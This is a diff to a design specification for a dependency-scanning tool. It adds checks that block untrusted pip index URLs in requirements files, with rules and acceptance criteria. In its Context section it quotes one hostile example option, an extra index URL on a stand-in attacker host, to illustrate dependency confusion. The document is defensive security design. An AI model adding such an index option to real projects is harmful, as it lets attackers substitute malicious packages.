@@ -37,10 +37,11 @@ In scope:
 - exact normalized source URL allowlists
 - source provenance checks against `poetry.lock` and `uv.lock`
 - warnings for declared-but-unused non-PyPI sources
+- `requirements*.txt` `--index-url` / `-i` / `--extra-index-url` options (added
+  2026-10-23; see "pip requirements files")
 
 Out of scope for this phase:
 
-- `requirements.txt` `--index-url` / `--extra-index-url`
 - `pip.conf`
 - `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and other env-driven source selection
 - host-local Python package-manager config outside the repo
@@ -189,6 +190,46 @@ uses:
 - do not block
 - suggest removing the unused source for clarity and maintenance
 
+## pip requirements files
+
+### Context
+
+pip reads `--index-url`, `-i`, and `--extra-index-url` from any requirements file,
+including files reached through `-r` and `-c`. Before this change only fully hash-locked
+pip-tools files were checked. An unhashed `requirements.txt` could set
+`--extra-index-url https://attacker.example/simple`; sloppy-joe vetted the public PyPI
+package of the same name while pip was free to install the attacker's copy
+(dependency confusion).
+
+### Rules
+
+- Every scanned requirements file, hash-locked or not, is checked together with
+  everything it includes through `-r` / `--requirement` and `-c` / `--constraint`.
+- Each declared index URL is normalized as above and must be either the default PyPI
+  simple index or an exact entry in `trusted_indexes.pypi` in the out-of-repo config.
+- A non-allowlisted index blocks the project. The error names the check
+  `resolution/untrusted-registry-source`, the index URL, and the requirements file that
+  declared it. The block happens in preflight, before any registry or OSV query.
+- `--find-links` / `-f`, `--no-index`, `--trusted-host`, non-HTTP(S) index URLs, and
+  index options placed after a requirement on the same line are unsupported pip options
+  and block as they did before.
+- Requirements files ignored because a Poetry or uv project owns the directory are not
+  scanned and are not checked; the existing legacy-manifest warning covers them.
+- Hash-locked pip-tools keeps its trust rule: it is fully trusted only when the file
+  graph binds the primary `--index-url`; otherwise it stays reduced-confidence.
+
+### Acceptance Criteria
+
+- **Given** a requirements file (or a file it includes) with `--index-url`, `-i`, or
+  `--extra-index-url` naming a non-PyPI index, **When** the index is not allowlisted,
+  **Then** the scan blocks with `resolution/untrusted-registry-source`.
+- **Given** the same file, **When** the exact normalized URL is in
+  `trusted_indexes.pypi`, **Then** the index does not block.
+- **Given** `--index-url https://pypi.org/simple` (any trailing slash or host case),
+  **When** no config is present, **Then** the index does not block.
+- **Given** an allowlist entry that is only a path prefix of the declared index,
+  **When** the scan runs, **Then** the scan blocks.
+
 ## Fail-Closed Conditions
 
 The scan must block when any of these are true:
@@ -308,7 +349,7 @@ Fail-closed:
 
 This phase should not expand into:
 
-- pip/pip-tools index flags
+- pip config files and `PIP_*` environment variables
 - local/editable package trust
 - broad wildcard URL trust
 - host-local source config support
